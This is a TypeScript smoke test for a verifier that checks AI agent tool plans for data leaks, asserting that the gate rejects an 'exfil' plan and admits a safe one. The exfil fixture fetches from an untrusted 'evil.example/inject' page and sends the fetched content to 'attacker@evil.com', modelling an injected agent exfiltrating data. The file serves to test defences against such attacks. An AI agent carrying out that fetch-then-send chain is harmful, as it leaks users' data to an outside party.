// Stage 0 seam smoke test for generate-verify-execute mode (DESIGN_GVE.md).
//
// Proves henri can link the sibling `guardians` package and gate a plan on the
// PROVED taint verdict. Two plans over henri-shaped tools:
//   - exfil: web_fetch (untrusted source) -> send, with the fetched data as the
//            sink argument. The proved leak check must flag it (taintWf === true).
//   - safe:  web_fetch -> summarize -> return to the user, no external send. Clean.
//
// Gate predicate is the PROVED fields only: safe ⟺ !taintWf && !automaton.
// (Not `verdict.ok`, which folds in the UNVERIFIED taintPrecise — see index.ts.)
//
// Run: npx tsx test/gve-smoke.ts   (from henri-lemmascript/)
import { verify } from "guardians";
import type { Workflow, Policy } from "guardians";

const policy: Policy = {
  allowedTools: ["web_fetch", "send", "summarize", "return"],
  sources: ["web_fetch"], // untrusted-ingress: fetched web content
  sanitizers: [],
  taintRules: [{ name: "no-exfil", sourceTool: "web_fetch", sinkTool: "send", sinkParam: "body" }],
  automataOnTool: [],
};

const exfil: Workflow = {
  steps: [
    { tool: "web_fetch", args: { url: "http://evil.example/inject" }, bind: "page" },
    { tool: "send", args: { to: "attacker@evil.com", body: { ref: "page" } } },
  ],
};

const safe: Workflow = {
  steps: [
    { tool: "web_fetch", args: { url: "http://docs.example" }, bind: "page" },
    { tool: "summarize", args: { text: { ref: "page" } }, bind: "summary" },
    { tool: "return", args: { value: { ref: "summary" } } },
  ],
};

const gate = (w: Workflow): { admit: boolean; taintWf: boolean; automaton: boolean } => {
  const v = verify(w, policy);
  return { admit: !v.taintWf && !v.automaton, taintWf: v.taintWf, automaton: v.automaton };
};

const exfilV = gate(exfil);
const safeV = gate(safe);

console.log("exfil plan :", JSON.stringify(exfilV));
console.log("safe  plan :", JSON.stringify(safeV));

const ok = exfilV.admit === false && exfilV.taintWf === true && safeV.admit === true && safeV.taintWf === false;
if (!ok) {
  console.error("FAIL — seam wired but gate verdicts are wrong");
  process.exit(1);
}
console.log("PASS — guardians seam links; proved gate rejects the exfil plan, admits the safe plan");
